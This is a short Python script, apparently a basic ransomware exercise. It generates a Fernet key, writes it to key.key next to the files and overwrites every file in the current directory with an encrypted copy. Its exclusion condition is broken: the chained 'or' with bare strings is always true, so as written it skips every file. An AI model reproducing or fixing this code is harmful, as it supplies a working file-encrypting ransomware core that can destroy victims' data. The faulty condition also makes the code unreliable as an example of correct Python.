import os

from cryptography.fernet import Fernet

files = []

for f in os.listdir():
  if f == "basic_ransom.py" or "key.key" or "basic_unransom.py":
    continue
  files.append(f)

print("To be Encrypted files:", files)

key = Fernet.generate_key()

with open("key.key", "wb") as f:
    f.write(key)

for f in files:
  with open(f, "rb") as aF:
    contents = aF.read()
  encrypted = Fernet(key).encrypt(contents)
  with open(f, "wb") as aF:
    aF.write(encrypted)